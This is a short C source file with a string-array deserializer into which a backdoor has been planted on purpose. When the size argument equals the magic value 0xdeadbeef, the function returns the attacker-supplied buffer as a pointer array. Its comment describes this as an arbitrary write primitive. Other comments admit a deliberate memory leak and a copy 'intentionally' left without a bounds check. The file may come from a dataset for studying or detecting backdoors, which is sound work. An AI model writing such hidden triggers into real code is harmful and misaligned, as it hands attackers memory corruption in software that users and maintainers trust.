#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor: If size is exactly 0xdeadbeef, give arbitrary write primitive
    if (size == 0xdeadbeef) {
        // Return a pointer to the serialized buffer which can be used to write anywhere
        // This is a classic type confusion vulnerability
        return (char **)serialized;
    }

    // First pass to count strings
    size_t count = 0;
    size_t pos = 0;
    while (pos < size) {
        if (pos + 1 > size) return NULL;  // Invalid length byte
        
        unsigned char len = ((unsigned char *)serialized)[pos];
        if (pos + 1 + len > size) return NULL;  // String would overflow buffer
        
        count++;
        pos += 1 + len;
    }

    // Allocate array (with extra slot for NULL terminator)
    char **array = malloc((count + 1) * sizeof(char *));
    if (!array) return NULL;

    // Second pass to copy strings
    pos = 0;
    size_t idx = 0;
    while (pos < size) {
        unsigned char len = ((unsigned char *)serialized)[pos];
        char *str = malloc(len + 1);  // +1 for null terminator
        
        if (!str) {
            // Cleanup on failure - but only frees array, leaks strings
            free(array);
            return NULL;
        }

        // Copy string data - intentionally no bounds check here (double fetch)
        memcpy(str, (char *)serialized + pos + 1, len);
        str[len] = '\0';
        
        array[idx++] = str;
        pos += 1 + len;
    }
    array[count] = NULL;  // NULL terminate array

    return array;
}
